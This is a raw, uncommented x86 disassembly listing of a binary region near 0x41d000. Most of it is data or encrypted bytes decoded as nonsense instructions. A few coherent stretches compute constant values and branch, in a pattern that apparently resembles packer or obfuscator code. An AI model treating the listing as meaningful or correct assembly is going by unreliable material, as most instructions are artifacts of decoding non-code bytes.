  41cf9f:	sti    
  41cfa0:	jp     0x41cfec
  41cfa2:	dec    ebp
  41cfa3:	lods   eax,DWORD PTR ds:[esi]
  41cfa4:	mov    eax,ds:0xc3e3c37a
  41cfa9:	or     dh,BYTE PTR [edx-0x57]
  41cfac:	or     BYTE PTR [ebx-0x51f34297],al
  41cfb2:	jp     0x41cf54
  41cfb4:	sti    
  41cfb5:	xor    al,0x16
  41cfb7:	mov    db3,edi
  41cfba:	push   eax
  41cfbb:	mov    ch,0x30
  41cfbd:	push   ebp
  41cfbf:	daa    
  41cfc0:	add    eax,0xd56148a3
  41cfc5:	outs   dx,BYTE PTR ds:[esi]
  41cfc6:	push   es
  41cfc7:	scas   eax,DWORD PTR es:[edi]
  41cfc8:	xchg   ecx,edx
  41cfca:	xchg   esi,eax
  41cfcb:	and    bl,BYTE PTR [edx]
  41cfcd:	ins    BYTE PTR es:[edi],dx
  41cfce:	out    0xaf,eax
  41cfd0:	or     al,0x9f
  41cfd2:	fldl2e 
  41cfd4:	fdivr  DWORD PTR [ebx-0x7c]
  41cfd7:	mov    eax,0xc4af6d46
  41cfdc:	fld    DWORD PTR [edi-0x12688118]
  41cfe2:	push   edi
  41cfe3:	not    bh
  41cfe5:	pop    ebp
  41cfe6:	xor    esp,edi
  41cfe8:	or     ecx,ebp
  41cfea:	or     ecx,DWORD PTR [edi]
  41cfec:	mov    eax,0xf7eb5dad
  41cff1:	inc    ecx
  41cff2:	cmc    
  41cff3:	xchg   ecx,eax
  41cff4:	into   
  41cff5:	out    dx,al
  41cff6:	jb     0x41cfa3
  41cff8:	pop    edx
  41cff9:	in     eax,0x67
  41cffb:	(bad)  
  41cffd:	lahf   
  41cffe:	(bad)  [edi-0x5ec79629]
  41d004:	es retf 0x39bb
  41d008:	push   0x546bd94a
  41d00d:	adc    BYTE PTR [ecx+0x3],ch
  41d010:	mov    cl,0x91
  41d012:	jns    0x41d015
  41d014:	jb     0x41d03a
  41d016:	fs sahf 
  41d018:	cmovno ebp,edx
  41d01b:	cld    
  41d01c:	out    0x3b,al
  41d01e:	fidiv  DWORD PTR [esi]
  41d020:	ins    DWORD PTR es:[edi],dx
  41d021:	popa   
  41d022:	add    cl,BYTE PTR ds:0xafe12609
  41d028:	mov    ebp,0x419ae5a
  41d02d:	inc    ebx
  41d02e:	aas    
  41d02f:	sub    BYTE PTR [edi+0x47],bh
  41d032:	mov    al,ds:0xb75ecce4
  41d037:	stc    
  41d038:	es jmp 0xb38248e9
  41d03e:	das    
  41d03f:	jns    0x41d0b1
  41d041:	adc    al,0xbb
  41d043:	pop    ebp
  41d044:	outs   dx,BYTE PTR ss:[esi]
  41d046:	(bad)  
  41d047:	cmp    eax,0x372f6150
  41d04c:	xchg   DWORD PTR [ebx+eax*1-0x35],edx
  41d050:	mov    ebp,0x1137d679
  41d055:	lods   eax,DWORD PTR ds:[esi]
  41d056:	pusha  
  41d057:	mov    WORD PTR [esi],?
  41d059:	std    
  41d05a:	xchg   ebx,eax
  41d05b:	repz xchg ebp,eax
  41d05d:	cmp    BYTE PTR [ebx],0x22
  41d060:	jmp    0x7de0:0xa6193b24
  41d067:	repz clc 
  41d069:	add    bl,ch
  41d06b:	mov    ah,BYTE PTR [ecx]
  41d06d:	pop    esi
  41d06e:	aaa    
  41d06f:	repnz fxch st(0)
  41d072:	mov    ah,0xa2
  41d074:	dec    esp
  41d075:	and    eax,0xc09cb1ca
  41d07a:	(bad)
  41d07d:	jp     0x41d01c
  41d07f:	test   BYTE PTR [ebx+eax*1-0x55],ah
  41d083:	ss test eax,0xca73ec90
  41d089:	addr16 sar BYTE PTR [bx],1
  41d08d:	mov    ebx,DWORD PTR [ebx]
  41d08f:	outs   dx,BYTE PTR ds:[esi]
  41d090:	add    esi,ebp
  41d092:	push   ebx
  41d093:	mov    ebp,0x6668da5f
  41d098:	jb     0x41d08b
  41d09a:	ja     0x41d09b
  41d09c:	(bad)  
  41d09d:	stos   BYTE PTR es:[edi],al
  41d09e:	scas   al,BYTE PTR es:[edi]
  41d09f:	enter  0x1722,0x7e
  41d0a3:	shl    DWORD PTR [ebx-0x52cece7e],1
  41d0a9:	dec    esi
  41d0aa:	mov    ch,0xac
  41d0ac:	les    eax,FWORD PTR [ebx+0x13]
  41d0af:	push   es
  41d0b0:	adc    esp,DWORD PTR [ebx]
  41d0b2:	mov    ecx,0x82aec30c
  41d0b7:	pop    ebp
  41d0b8:	mov    ds:0x31075a7c,eax
  41d0bd:	fwait
  41d0be:	jno    0x41d08c
  41d0c0:	xor    BYTE PTR [ebp+0x47792147],dh
  41d0c6:	in     al,0x20
  41d0c8:	rol    DWORD PTR [ecx-0x35],cl
  41d0cb:	or     ebx,ecx
  41d0cd:	fldcw  WORD PTR [edx]
  41d0cf:	ror    DWORD PTR [edx+0x2c38244c],0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x2bbc6585
  41d15f:	std    
  41d160:	repnz push 0x36
  41d163:	pop    ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1-0x35c8e7e8],bh
  41d16c:	mov    DWORD PTR [eax],ebp
  41d16e:	lds    ebx,FWORD PTR [edx+ebx*8]
  41d171:	pop    ecx
  41d172:	adc    BYTE PTR [edi+0x772a9ca2],0x90
  41d179:	loope  0x41d19c
  41d17b:	imul   esi,DWORD PTR [edi+0x44],0x72
  41d17f:	int    0x2b
  41d181:	push   0x6738bd12
  41d186:	cli    
  41d187:	pushf  
  41d188:	xchg   ebp,eax
  41d189:	sub    eax,0x9c3e7402
  41d18e:	test   al,0xdc
  41d190:	sub    DWORD PTR [edi],0xfffffff5
  41d193:	fdivr  DWORD PTR [eax+0x36e02efb]
  41d199:	pop    ds
  41d19a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d19b:	add    eax,0x9d20cdda
  41d1a0:	mov    DWORD PTR [edi+0x11c4a7a3],ebx
  41d1a6:	jl     0x41d1ff
  41d1a8:	add    dh,al
  41d1aa:	jae    0x41d18a
  41d1ac:	rcr    BYTE PTR fs:[ecx+0x1a3e88f],1
  41d1b3:	inc    BYTE PTR [ebx-0x20d850ab]
  41d1b9:	push   edi
  41d1ba:	xchg   ebp,eax
  41d1bb:	dec    ebx
  41d1bc:	xchg   DWORD PTR [esp+ecx*2],edi
  41d1bf:	or     al,0x1f
  41d1c1:	cmp    eax,0x1672b652
  41d1c6:	sahf   
  41d1c7:	or     eax,0x7e3059f
  41d1cc:	push   ds
  41d1cd:	mov    eax,ds:0xd9fee43e
  41d1d2:	call   0x795ee6ef
  41d1d7:	and    eax,0xb107b213
  41d1dc:	cmc    
  41d1dd:	jmp    0x41d1c8
  41d1df:	pop    ss
  41d1e0:	dec    esi
  41d1e1:	ins    DWORD PTR es:[edi],dx
  41d1e2:	ror    al,0xc3
  41d1e5:	cli    
  41d1e6:	mov    ch,0xfc
  41d1e8:	xchg   esi,eax
  41d1e9:	ret    
  41d1ea:	mov    al,ds:0xa5019bb
  41d1ef:	jno    0x41d1e3
  41d1f1:	popa   
  41d1f2:	mov    ds:0xfc8de1fe,al
  41d1f7:	xchg   esp,eax
  41d1f8:	jmp    0x41d251
  41d1fa:	pop    eax
  41d1fb:	push   ss
  41d1fc:	adc    al,0xfe
  41d1fe:	sub    ah,BYTE PTR [eax]
  41d200:	fcmove st,st(7)
  41d202:	out    0xa1,al
  41d204:	scas   al,BYTE PTR es:[edi]
  41d205:	mov    bl,0x99
  41d207:	mov    al,ds:0x7b391e51
  41d20c:	out    dx,eax
  41d20d:	in     al,0x1b
  41d20f:	pop    ecx
  41d210:	dec    edx
  41d211:	mov    ecx,0xb6c97c8a
  41d216:	mov    bl,BYTE PTR [esi+0x2f825f0c]
  41d21c:	mov    al,ds:0x2e04f6e7
  41d221:	fisttp DWORD PTR [esi-0x2bde8534]
  41d227:	and    esi,DWORD PTR [esi+0x5e]
  41d22a:	cmp    al,0x95
  41d22c:	xor    ecx,DWORD PTR [edi]
  41d22e:	inc    ebx
  41d22f:	test   BYTE PTR [ebp+0x78],bh
  41d232:	daa    
  41d233:	inc    edi
  41d234:	jmp    0xbee70bde
  41d239:	pop    edi
  41d23a:	iret   
  41d23b:	popf   
  41d23c:	ins    DWORD PTR es:[edi],dx
  41d23d:	mov    cl,BYTE PTR [ebp-0x34147bcf]
  41d243:	bound  edi,QWORD PTR [edi+0x478b8273]
  41d249:	xchg   ecx,eax
  41d24a:	sbb    bh,cl
  41d24c:	sbb    al,0xc9
  41d24e:	je     0x41d28d
  41d250:	pop    esi
  41d251:	push   ebx
  41d252:	adc    eax,0xe6f6dd35
  41d257:	and    al,0x5c
  41d259:	mov    ds:0xcec9b585,eax
  41d25e:	clc    
  41d25f:	lods   al,BYTE PTR ds:[esi]
  41d260:	arpl   di,cx
  41d262:	xchg   esi,eax
  41d263:	mov    edi,0xc22a76fc
  41d268:	call   0x3b149e6
  41d26d:	cmp    al,0x25
  41d26f:	add    DWORD PTR [edi+edx*2+0x9f078a8],edx
  41d276:	mov    dl,0xfc
  41d278:	jecxz  0x41d220
  41d27a:	int3   
  41d27b:	shl    DWORD PTR [esi+0x57],1
  41d27e:	scas   al,BYTE PTR es:[edi]
  41d27f:	cld    
  41d280:	mov    dl,0x81
  41d282:	xor    BYTE PTR [esi+eax*2+0x70fad65f],dh
  41d289:	xchg   edx,eax
  41d28a:	and    ch,BYTE PTR [ebp-0x2e]
  41d28d:	(bad)  
  41d28e:	pusha  
  41d28f:	adc    DWORD PTR [ebp+eiz*1+0x40adbc51],esi
  41d296:	mov    al,0xac
  41d298:	push   0xa8ccc6d5
  41d29d:	dec    edi
  41d29e:	aam    0xb
  41d2a0:	mov    eax,ds:0x597115b4
  41d2a5:	aam    0xb6
  41d2a7:	dec    edi
  41d2a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2a9:	pushf  
  41d2aa:	mov    al,0xc3
  41d2ac:	std    
  41d2ad:	call   0xc004:0x13a5666a
  41d2b4:	inc    ebp
  41d2b5:	mov    al,ds:0xc0c31edb
  41d2ba:	mov    ah,0x2d
  41d2bc:	es clc 
  41d2be:	pop    ecx
  41d2bf:	das    
  41d2c0:	jle    0x41d2f9
  41d2c2:	cmp    esi,DWORD PTR ds:0x9a455024
  41d2c8:	sub    dh,BYTE PTR [eax+eiz*8+0x2cf1263f]
  41d2cf:	jge    0x41d280
  41d2d1:	jp     0x41d2d5
  41d2d3:	fs lahf 
  41d2d5:	scas   al,BYTE PTR es:[edi]
  41d2d6:	lock xor DWORD PTR [eax+0x476265],esp
  41d2dd:	dec    ecx
  41d2de:	jmp    0x2b524ff2
  41d2e3:	jmp    0x41d288
  41d2e5:	xor    DWORD PTR [eax],0x91f8bc0d
  41d2eb:	and    esp,esi
  41d2ed:	(bad)  
  41d2f0:	stos   BYTE PTR es:[edi],al
  41d2f1:	das    
  41d2f2:	fidiv  WORD PTR [ecx]
  41d2f4:	mov    edi,0xb3bfff0b
  41d2f9:	and    esi,ebp
  41d2fb:	scas   eax,DWORD PTR es:[edi]
  41d2fc:	aas    
  41d2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2fe:	inc    edi
  41d2ff:	test   ebx,0xdde69e55
  41d305:	es scas eax,DWORD PTR es:[edi]
  41d307:	pusha  
  41d308:	mov    ds:0x9e4cdc1c,eax
  41d30d:	and    cl,BYTE PTR [eax+0x2f52ff8d]
  41d313:	jmp    0xeddf9ab8
  41d318:	push   ebx
  41d319:	loope  0x41d2eb
  41d31b:	jb     0x41d37b
  41d31d:	mov    eax,DWORD PTR [esi-0x1]
  41d320:	cmc    
  41d321:	sbb    al,0x52
  41d323:	sahf   
  41d324:	and    al,0xf4
  41d326:	shl    BYTE PTR [ecx+0x62ef7ec4],cl
  41d32c:	dec    ebp
  41d32d:	dec    edi
  41d32e:	and    al,0xe
  41d330:	push   0x5a
  41d332:	xchg   ebp,eax
  41d333:	pusha  
  41d334:	rcl    BYTE PTR [edi-0x79c9d13],0xc0
  41d33b:	jns    0x41d3a8
  41d33d:	inc    esp
  41d33e:	sub    al,bl
  41d340:	mov    al,ds:0x95e3ce10
  41d345:	push   ebx
  41d346:	pop    ebp
  41d347:	test   BYTE PTR ds:0xb4d9901b,al
  41d34d:	push   0x62
  41d34f:	je     0x41d3b9
  41d351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d352:	je     0x41d30a
  41d354:	dec    ecx
  41d355:	xchg   edi,eax
  41d356:	sbb    eax,0x4eb1c0d2
  41d35b:	imul   esi,DWORD PTR [ecx+0x4644a7c],0x1dd0db07
  41d365:	jg     0x41d3b1
  41d367:	adc    dl,BYTE PTR cs:[edi+0x2c]
  41d36b:	mov    edx,0x3005a66
  41d370:	lods   al,BYTE PTR ds:[esi]
  41d371:	pop    edi
  41d372:	sbb    ch,BYTE PTR [esi-0x3f506cd9]
  41d378:	sbb    esi,esp
  41d37a:	mov    ah,0x21
  41d37c:	inc    edx
  41d37d:	push   ebp
  41d37e:	jmp    0x9247e36b
  41d383:	frstor [ecx-0x483ba75c]
  41d389:	pop    esi
  41d38a:	dec    ebp
  41d38b:	xchg   edi,eax
  41d38c:	sub    DWORD PTR [ebp-0x63],esp
  41d38f:	jne    0x41d337
  41d391:	sar    DWORD PTR [ebx+0x5f73fd6d],cl
  41d397:	popf   
  41d398:	addr16 in eax,dx
  41d39a:	inc    esp
  41d39b:	push   ss
  41d39c:	sbb    eax,0x67c61554
  41d3a1:	xchg   ebx,eax
  41d3a2:	push   ds
  41d3a3:	sti    
  41d3a4:	stc    
  41d3a5:	jne    0x41d394
  41d3a7:	aam    0xc5
  41d3a9:	dec    ebx
  41d3aa:	popa   
  41d3ab:	in     eax,dx
  41d3ac:	(bad)  
  41d3ad:	jmp    0x7d28dc52
  41d3b2:	push   ax
  41d3b4:	(bad)  
  41d3b5:	cmp    ecx,DWORD PTR [edi+edi*4-0x1b990369]
  41d3bc:	into   
  41d3bd:	bound  edi,QWORD PTR [eax+0x3c2117c]
  41d3c3:	and    BYTE PTR [esi],ah
  41d3c5:	jno    0x41d435
  41d3c7:	xchg   esp,eax
  41d3c8:	lods   al,BYTE PTR ds:[esi]
  41d3c9:	or     cl,BYTE PTR [esi+0x1e]
  41d3cc:	rcr    bl,cl
  41d3ce:	jecxz  0x41d38f
  41d3d0:	sti    
  41d3d1:	jbe    0x41d3cd
  41d3d3:	mov    WORD PTR [ebp+0xa1018a4],ss
  41d3d9:	in     al,dx
  41d3da:	pop    es
  41d3db:	daa    
  41d3dc:	stc    
  41d3dd:	pop    ebp
  41d3de:	fs inc eax
  41d3e0:	outs   dx,BYTE PTR ds:[esi]
  41d3e1:	inc    ebp
  41d3e2:	aaa    
  41d3e3:	clc    
  41d3e4:	cmp    al,0x35
  41d3e6:	push   edi
  41d3e7:	jo     0x41d3a8
  41d3e9:	xchg   DWORD PTR [ecx],ebx
  41d3eb:	stos   BYTE PTR es:[edi],al
  41d3ec:	dec    ebx
  41d3ed:	mov    dh,0xa6
  41d3ef:	dec    edi
  41d3f0:	jle    0x41d380
  41d3f2:	ret    
  41d3f3:	cmp    eax,0x2c4a8ff0
  41d3f8:	out    0x39,al
  41d3fa:	mov    eax,0x989a6413
  41d3ff:	push   edx
  41d400:	add    ch,dh
  41d402:	dec    ebx
  41d403:	js     0x41d3a1
  41d405:	call   FWORD PTR [edx+eax*4]
  41d408:	push   edx
  41d409:	pop    eax
  41d40a:	and    DWORD PTR [edx+0x3535fc74],ebx
  41d410:	outs   dx,DWORD PTR ds:[esi]
  41d411:	dec    edi
  41d412:	lock lahf 
  41d414:	loope  0x41d450
  41d416:	inc    esp
  41d417:	ins    DWORD PTR es:[edi],dx
  41d418:	jbe    0x41d42b
  41d41a:	cld    
  41d41b:	pop    ebx
  41d41c:	ins    BYTE PTR es:[edi],dx
  41d41d:	add    ch,BYTE PTR [ebp+0x49683bbd]
  41d423:	mov    dl,0x84
  41d425:	dec    ebp
  41d426:	inc    edx
  41d427:	jns    0x41d3b3
  41d429:	push   ebx
  41d42a:	inc    ebx
  41d42b:	in     al,0xea
  41d42d:	dec    ebx
  41d42e:	out    0xf2,al
  41d430:	mov    ah,0x5d
  41d432:	mov    bh,0x29
  41d434:	sub    eax,0xc688d792
  41d439:	int    0x15
  41d43b:	xor    bh,dh
  41d43d:	pop    ss
  41d43e:	jmp    0x796f7533
  41d443:	push   cs
  41d444:	xchg   ecx,eax
  41d445:	pop    es
  41d446:	fcmovu st,st(0)
  41d448:	bound  ecx,QWORD PTR [ebp+0x26e91b1]
  41d44e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d44f:	out    dx,eax
  41d450:	xchg   DWORD PTR [edx],edx
  41d452:	ja     0x41d433
  41d454:	sbb    BYTE PTR ds:0xe14921ef,0x6b
  41d45b:	scas   eax,DWORD PTR es:[edi]
  41d45c:	neg    bh
  41d45e:	jg     0x41d4b6
  41d460:	ret    0x74b1
  41d463:	imul   esi,DWORD PTR [ebp-0x319c3110],0x2408ad96
  41d46d:	lods   eax,DWORD PTR ds:[esi]
  41d46e:	lds    edi,FWORD PTR [eax+0x75b40f95]
  41d474:	or     dl,BYTE PTR ds:0x229ed70f
  41d47a:	add    al,0x44
  41d47c:	push   0x187cbb05
  41d481:	adc    DWORD PTR [eax],eax
  41d483:	cmp    al,0x22
  41d485:	mov    bh,0x7b
  41d487:	sahf   
  41d488:	jne    0x41d445
  41d48a:	inc    edi
  41d48b:	sub    DWORD PTR [eax-0x7d70a352],0x104f662f
  41d495:	mov    ebp,0xc8635ea
  41d49a:	mov    DWORD PTR [edi-0x38],eax
  41d49d:	xchg   esp,eax
  41d49e:	push   cs
  41d49f:	imul   esp,esi,0x94a40464
  41d4a5:	loope  0x41d502
  41d4a7:	jmp    0x6fbb:0x6f421171
  41d4ae:	ins    DWORD PTR es:[edi],dx
  41d4af:	push   ds
  41d4b0:	(bad)  
  41d4b1:	aam    0x2
  41d4b3:	in     al,0x32
  41d4b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4b6:	out    dx,al
  41d4b7:	popa   
  41d4b8:	popa   
  41d4b9:	jp     0x41d511
  41d4bb:	stc    
  41d4bc:	sbb    dh,0xe
  41d4bf:	xchg   esi,eax
  41d4c0:	lahf   
  41d4c1:	inc    ebx
  41d4c2:	iret   
  41d4c3:	into   
  41d4c4:	imul   edi,ecx,0x76
  41d4c7:	fptan  
  41d4c9:	mov    ebx,0x6c947c63
  41d4ce:	cmp    DWORD PTR ds:0xb00112d3,eax
  41d4d4:	and    cl,cl
  41d4d6:	jmp    0x72902981
  41d4db:	nop    DWORD PTR [edx]
  41d4de:	pushf  
  41d4df:	cli    
  41d4e0:	icebp  
  41d4e1:	jae    0x41d53f
  41d4e3:	rcl    BYTE PTR ds:0xfc64bc5,0x34
  41d4ea:	mov    ebp,0x2d35a00e
  41d4ef:	out    dx,al
  41d4f0:	bound  ecx,QWORD PTR [eax-0x1b63c601]
  41d4f6:	mov    bl,0x5c
  41d4f8:	int    0x68
  41d4fa:	adc    DWORD PTR [edx],ecx
  41d4fc:	adc    eax,0x680712d5
  41d501:	sar    DWORD PTR [ebp+0xecd606e],cl
  41d507:	push   edi
  41d508:	inc    ebx
  41d509:	lahf   
  41d50a:	popa   
  41d50b:	sar    BYTE PTR [ebp+0x44649888],cl
  41d511:	(bad)
  41d515:	pop    eax
  41d516:	xor    dl,dh
  41d518:	hlt    
  41d519:	ins    BYTE PTR es:[edi],dx
  41d51a:	(bad)  
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d55c
  41d54b:	bound  edi,QWORD PTR [ebx-0x50]
  41d54e:	ficom  DWORD PTR [ebp+0x16]
  41d551:	sbb    BYTE PTR [edx+edx*1+0x38a01818],bh
  41d558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d559:	das    
  41d55a:	mov    dh,0xfe
  41d55c:	out    0xd6,eax
  41d55e:	mov    al,ds:0x55e6c2dc
  41d563:	cmp    eax,0x86408d29
  41d568:	sbb    ch,BYTE PTR [edx]
  41d56a:	adc    ch,BYTE PTR [edi+0x5608928a]
  41d570:	xchg   ecx,eax
  41d571:	cs mov esp,0x6ba0c2a7
  41d577:	and    DWORD PTR [ebx],ecx
  41d579:	add    eax,0x281b15ba
  41d57e:	mov    bh,BYTE PTR [ebx+0x760c5c95]
  41d584:	fstp   st(0)
  41d586:	in     eax,0xdf
  41d588:	add    BYTE PTR [ebx+0x8],bl
  41d58b:	push   0xffffffd7
  41d58d:	pop    edi
  41d58e:	xlat   BYTE PTR ds:[ebx]
  41d58f:	aaa    
  41d590:	and    BYTE PTR [edi-0x1e],al
  41d593:	push   ss
  41d594:	mov    DWORD PTR [edx],eax
  41d596:	xchg   esi,eax
  41d597:	mov    esp,0xf42035a4
  41d59c:	mov    bh,0x7c
  41d59e:	nop
  41d59f:	std    
  41d5a0:	mov    dl,0x70
  41d5a2:	js     0x41d5b2
  41d5a4:	inc    esp
  41d5a5:	mov    BYTE PTR [edi-0x37263e48],ch
  41d5ab:	mov    cl,0x6f
  41d5ad:	cmp    eax,0x844ac349
  41d5b2:	push   edi
  41d5b3:	jl     0x41d59e
  41d5b5:	adc    DWORD PTR [esi-0x3aa5e3c8],eax
  41d5bb:	jl     0x41d572
  41d5bd:	test   edx,esi
  41d5bf:	nop
  41d5c0:	inc    edi
  41d5c1:	std    
  41d5c2:	mov    bl,BYTE PTR [edx]
  41d5c4:	jmp    0x5b26:0x3c6e81a8
  41d5cb:	in     eax,dx
  41d5cc:	xor    al,0x84
  41d5ce:	ins    BYTE PTR es:[edi],dx
  41d5cf:	sbb    al,0xf6
  41d5d1:	adc    BYTE PTR [edi+0x6f],al
  41d5d4:	dec    edi
  41d5d5:	and    bl,BYTE PTR [ebx+0x44]
  41d5d8:	mov    cl,0x77
  41d5da:	mov    eax,0x72972117
  41d5df:	enter  0x6202,0x73
  41d5e3:	sti    
  41d5e4:	stc    
  41d5e5:	das    
  41d5e6:	push   edi
  41d5e7:	sub    DWORD PTR [ecx+0x34],0x747656c0
  41d5ee:	mov    ecx,0x25e0734f
  41d5f3:	bound  ecx,QWORD PTR [edi+0x79]
  41d5f6:	aad    0x6a
  41d5f8:	loopne 0x41d5d0
  41d5fa:	push   ecx
  41d5fb:	scas   al,BYTE PTR es:[edi]
  41d5fc:	scas   al,BYTE PTR es:[edi]
  41d5fd:	mov    ah,0x56
  41d5ff:	push   ebp
  41d600:	das    
  41d601:	outs   dx,DWORD PTR ds:[esi]
  41d602:	das    
  41d603:	pop    ss
  41d604:	sbb    edi,esp
  41d606:	cmc    
  41d607:	fld    DWORD PTR [esi-0x4f]
  41d60a:	mov    eax,0x482eb051
  41d60f:	iret   
  41d610:	das    
  41d611:	jmp    0xb9b67ef0
  41d616:	les    ecx,FWORD PTR [ebx]
  41d618:	xor    ebp,esp
  41d61a:	iret   
  41d61b:	mov    edi,0x2ae4c29a
  41d620:	pop    ecx
  41d621:	(bad)  
  41d622:	icebp  
  41d623:	jl     0x41d699
  41d625:	enter  0x2f94,0x2d
  41d629:	enter  0xd5e1,0x4f
  41d62d:	rol    DWORD PTR [ecx+0x21b80330],1
  41d633:	sub    ah,BYTE PTR [ecx+edx*1-0x18d18591]
  41d63a:	pushf  
  41d63b:	sti    
  41d63c:	push   ss
  41d63d:	scas   eax,DWORD PTR es:[edi]
  41d63e:	xor    ch,0xfa
  41d641:	xchg   ecx,eax
  41d642:	sar    BYTE PTR [ecx],1
  41d644:	sbb    eax,0x23f9ecff
  41d649:	lods   al,BYTE PTR ds:[esi]
  41d64a:	mov    bl,0x5e
  41d64c:	mov    al,ds:0xd5b9e1d0
  41d651:	std    
  41d652:	stos   BYTE PTR es:[edi],al
  41d653:	fwait
  41d654:	rcr    DWORD PTR [ebx+0x77],1
  41d657:	cli    
  41d658:	mov    al,0xf
  41d65a:	or     esp,eax
  41d65c:	and    DWORD PTR [ecx],eax
  41d65e:	ins    BYTE PTR es:[edi],dx
  41d65f:	aas    
  41d660:	cmc    
  41d661:	adc    al,0x5d
  41d663:	nop
  41d664:	mov    ds:0x3bd0fcc0,eax
  41d669:	dec    esi
  41d66a:	adc    eax,0xb67ef148
  41d66f:	mov    esi,0x14d0d1d
  41d674:	sub    esp,DWORD PTR [ebx-0x20]
  41d677:	sbb    al,0xac
  41d679:	push   0x70
  41d67b:	add    DWORD PTR [ebp-0x32],eax
  41d67e:	enter  0xbbdf,0x53
  41d682:	jnp    0x41d6c8
  41d684:	pop    ss
  41d685:	and    ch,dh
  41d687:	mov    cl,0x8a
  41d689:	mov    esi,0xfe32d368
  41d68e:	mov    ah,0xb1
  41d690:	sar    DWORD PTR [edi],1
  41d692:	fldcw  WORD PTR [eax+0x2a]
  41d695:	mov    ds:0x5034d84b,al
  41d69a:	sti    
  41d69b:	hlt    
  41d69c:	sbb    bl,cl
  41d69e:	fiadd  WORD PTR [ecx+0x4be87a0b]
  41d6a4:	dec    ebx
  41d6a5:	out    0xbd,al
  41d6a7:	fcomp  QWORD PTR [ecx+0x689844f9]
  41d6ad:	out    0x71,eax
  41d6af:	pop    esi
  41d6b0:	push   edx
  41d6b1:	outs   dx,BYTE PTR ds:[esi]
  41d6b2:	cmp    DWORD PTR [esi],edi
  41d6b4:	(bad)  
  41d6b5:	jns    0x41d6a4
  41d6b7:	repz js 0x41d6a0
  41d6ba:	cwde   
  41d6bb:	pop    ecx
  41d6bc:	call   0x2f31:0x8f57ac8b
  41d6c3:	sub    DWORD PTR [eax-0x1cd6d58b],edi
  41d6c9:	jle    0x41d67d
  41d6cb:	mov    BYTE PTR [edx-0xf],bl
  41d6ce:	out    0x86,eax
  41d6d0:	and    eax,0xe8fda649
  41d6d5:	jge    0x41d698
  41d6d7:	inc    esi
  41d6d8:	mov    WORD PTR ds:0x8e8ad439,es
  41d6de:	or     BYTE PTR [edi-0x7a],cl
  41d6e1:	shl    BYTE PTR [edx+0x56c63782],cl
  41d6e7:	cmp    ah,BYTE PTR cs:[edx+0x13d6a491]
  41d6ee:	retf   
  41d6ef:	jnp    0x41d750
  41d6f1:	pushf  
  41d6f2:	cli    
  41d6f3:	in     al,0x2
  41d6f5:	pusha  
  41d6f6:	push   ebx
  41d6f7:	ficomp WORD PTR [edi+0x2977bad1]
  41d6fd:	mov    esi,ecx
  41d6ff:	inc    ecx
  41d700:	bound  eax,QWORD PTR [edi+0x14]
  41d703:	mov    al,ds:0x8169667d
  41d708:	fisubr DWORD PTR [edi+0x4c6d8cec]
  41d70e:	aaa    
  41d70f:	outs   dx,DWORD PTR ds:[esi]
  41d710:	mov    edx,0x30d34fa
  41d715:	mov    al,0x84
  41d717:	stos   DWORD PTR es:[edi],eax
  41d718:	pop    esi
  41d719:	stc    
  41d71a:	mov    edi,0xc3fdca98
  41d71f:	(bad)  
  41d720:	leave  
  41d721:	pusha  
  41d722:	mov    ah,0x86
  41d724:	and    al,0x4c
  41d726:	sub    BYTE PTR [edi],dl
  41d728:	mov    bl,0x58
  41d72a:	jnp    0x41d6e4
  41d72c:	shr    BYTE PTR [edx-0x6e],1
  41d72f:	jmp    0x6027:0x9e788472
  41d736:	add    al,0x8d
  41d738:	jle    0x41d6ce
  41d73a:	mov    bl,0x5e
  41d73c:	jb     0x41d730
  41d73e:	(bad)  [ebx]
  41d740:	es nop
  41d742:	dec    esp
  41d743:	push   ebp
  41d744:	addr16 test ch,dh
  41d747:	mov    WORD PTR [eax+0x45],cs
  41d74a:	sbb    DWORD PTR [ebp-0x3b],esi
